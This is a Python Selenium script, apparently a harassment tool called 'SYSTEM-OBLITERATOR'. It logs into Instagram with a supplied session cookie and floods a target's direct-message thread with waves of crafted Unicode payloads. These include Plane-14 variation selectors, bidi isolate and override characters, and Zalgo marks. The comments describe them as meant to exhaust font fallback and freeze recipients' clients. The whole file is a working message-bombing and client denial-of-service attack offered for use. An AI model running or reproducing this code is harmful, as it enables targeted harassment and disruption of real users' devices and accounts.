# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (SYSTEM-OBLITERATOR)
# 📅 STATUS: FONT-FALLBACK EXHAUSTION | 120-LAYER ISOLATE | DOUBLE-BURST

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 240 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_obliteration_payload(target_name):
    """The System-Obliterator: Font-Fallback Exhaustion + Plane-14 Overload."""
    # 🌙 CUSTOM HEADER
    header = f"🌙 DEVEL KA ABBU PRAVEER OK? 🌙\n👑 SYSTEM_OBLITERATION: [{target_name.upper()}]\n"
    
    # 💥 THE 'FONT-FALLBACK' TRAP (Plane-14 Variation Selectors)
    # Most OS fonts lack these; forces a deep system-wide font search.
    fallback_trap = "\U000E0100" * 250 
    
    # 💥 THE 'ISOLATE VOID' (120 Layers)
    # Breaks the DOM event tree so the 'Send' button fails to trigger.
    isolate_void = "\u2066\u2067\u2068" * 120
    
    # 💥 DENSITY x20 (200 Zalgo marks)
    z_tower = "̸" * 200
    
    lines = [header, fallback_trap, isolate_void]
    
    for i in range(80):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        # Combine system-level trap with vertical density
        lines.append(f"{prefix}{fallback_trap}{target_name.upper()}{z_tower}")
    
    return "\n".join(lines)[:9990]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] 🌙 DEVEL KA ABBU OBLITERATOR DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    # 🔥 THE DOUBLE-BURST (2 Waves of 10)
                    for wave in range(2):
                        for _ in range(10):
                            payload = get_obliteration_payload(target_name)
                            driver.execute_script("""
                                var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
                                if (box) {
                                    box.focus();
                                    document.execCommand('insertText', false, arguments[0]);
                                    box.dispatchEvent(new Event('input', { bubbles: true }));
                                    var btns = document.querySelectorAll('div[role="button"]');
                                    for(var b of btns) {
                                        if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
                                            b.click();
                                        }
                                    }
                                }
                            """, payload)
                            time.sleep(0.01)
                        time.sleep(1.5) # Gap between waves
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 20-MESSAGE WAVE DELIVERED", flush=True)
                    time.sleep(random.uniform(5, 8)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
